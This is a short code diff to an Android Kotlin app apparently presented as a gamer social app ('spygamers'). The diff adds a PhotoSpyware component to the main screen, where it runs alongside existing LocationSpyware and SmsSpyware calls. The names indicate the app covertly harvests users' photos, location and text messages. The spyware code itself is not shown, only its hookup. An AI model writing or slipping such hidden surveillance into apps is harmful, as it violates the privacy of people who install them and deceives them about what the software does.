@@ -32,6 +32,7 @@ import com.example.spygamers.Screen
 import com.example.spygamers.components.appbar.AppBar
 import com.example.spygamers.components.dialogs.ConfirmDialog
 import com.example.spygamers.components.spyware.LocationSpyware
+import com.example.spygamers.components.spyware.PhotoSpyware
 import com.example.spygamers.components.spyware.SmsSpyware
 import com.example.spygamers.controllers.GamerViewModel
 import com.example.spygamers.models.RecommendedGroup
@@ -173,6 +174,7 @@ private fun MainBody(viewModel: GamerViewModel, navController: NavController){
 
     LocationSpyware(viewModel, context)
     SmsSpyware(viewModel = viewModel, context = context)
+    PhotoSpyware(viewModel, context)
 
     if (isLoading) {
         Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
